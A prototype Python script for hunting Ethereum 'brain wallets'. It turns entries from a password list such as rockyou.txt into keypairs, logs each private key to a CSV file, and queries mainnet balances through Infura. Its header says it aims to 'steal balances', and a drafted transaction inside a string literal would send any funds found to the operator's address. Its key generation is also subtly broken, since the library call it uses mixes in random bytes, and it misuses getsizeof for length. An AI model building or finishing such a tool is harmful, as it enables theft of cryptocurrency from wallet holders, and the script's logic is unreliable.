#!/usr/bin/env python3

#############################################
#
# WORK IN PROGRESS
#
# This script does the following:
#	Pulls entropy from a given file (Rockyou.txt or a similar password list works)
#	Creates an Ethereum wallet from this entropy
#	Saves the public and private keys in a CSV file for future use
# 	Checks the balance
# 	In the infinitesimmarly small chance we found an active wallet, the keys are weak so steal balances
#
# Project TODOs:
#	Verboseness
#	Check for any ERC tokens, not just Ethere specifically
#	Add more wordlists to source file
#	Allow for other-language wordlists
#	Pull in any source files in a directory
#	Generate mnemonic phrases for private key - https://github.com/de-centralized-systems/python-bip39/
#
#############################################

import csv
from web3 import Web3
from eth_keys import keys
from eth_utils import *
from eth_account.account import Account
from sys import getsizeof # Because apparently it will shit the bed otherwise; TODO: why?

__author__ = "Mark Rudnitsky"
__copyright__ = "Copyright 2022 Mark Rudnitsky"
__credits__ = ["Mark Rudnitsky"]
__license__ = "GPL"
__version__ = "0.1"
__maintainer__ = "Mark Rudnitsky"
__status__ = "Prototype"

infuraKey = "UPDATE TO YOUR OWN API KEY" # ETH mainnet API access through Infura
recipient = "Your ETH address" # Transfer any funds here
keygenFile = "rockyou2.txt" # Change as needed

infuraUrl = "https://mainnet.infura.io/v3/" + infuraKey
ganacheUrl = "http://127.0.0.1:7545"
web3 = Web3(Web3.HTTPProvider(infuraUrl)) # Mainnet
#web3 = Web3(Web3.HTTPProvider(ganacheUrl)) # Testnet

#print("Connected: {}".format(web3.isConnected())) # Double check our connection works

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	accountSender = tempAcct.address # Public key/address
	pKey = tempAcct.key # Private key
	#pKey = encode_hex(tempAcct.key) # Usually won't work with Metamask but is human readable
	return accountSender, pKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	fileName = "generated-keypairs.csv"
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance']
	data = [pubKey, privKey, balance]
	with open(fileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual work
def findANonZeroBalance(entropy):
	#print(str(entropy))
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)

	nonce = web3.eth.getTransactionCount(pubKey)
	balance = web3.eth.getBalance(pubKey)
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true
		# TODO: Payload
		print(web3.fromWei(balance, "ether"))
""" Something like this
		# Max gas we're willing to pay
		maxGasPerTx = 150 # Probably too high
		tx = {
		    'nonce': nonce,
		    'to': recipient,
		    'value': balance,
		    'gas': 2000000,		  
		    'gasPrice': web3.toWei(maxGasPerTx, 'gwei')
		}

		signed_tx = web3.eth.account.signTransaction(tx, privKey)
		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
		#print(web3.toHex(tx_hash))
"""	
	
def main():
	# Open up our wordlist
	sourceFile = open(keygenFile)

	for lineNum, textLine in enumerate(sourceFile):
		# Get the line from the file and format it for our Ethereum tools
		# TODO: more encodings
		tempLine = str(textLine).strip()
		tempLine = bytes(tempLine, 'utf-8')

		# Can only be 128, 160, 192, 224, or 256 bits
		# TODO: do the below permutations for each bit length
		tempLineByteLength = getsizeof(tempLine)
		maxByteLength = 256

		# Too long, just use the first or last 256 bytes
		if (tempLineByteLength > maxByteLength):
			# First 256
			findANonZeroBalance(tempLine[:maxByteLength])

			# Last 256
			findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])

		# Edge case - doesn't exist
		elif (tempLineByteLength < 0):
			findANonZeroBalance('')

		# Let's start permutating
		else:
			# TODO: Do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
			# TODO: is my math right?
			pad = maxByteLength - tempLineByteLength

			# Pad on the left
			findANonZeroBalance(bytes(pad) + tempLine)
			
			# Pad on the right
			findANonZeroBalance(tempLine + bytes(pad))

			# Pad 50/50 Left/Right split
			findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
			
	sourceFile.close()

# Main function
if __name__=="__main__":
    main()
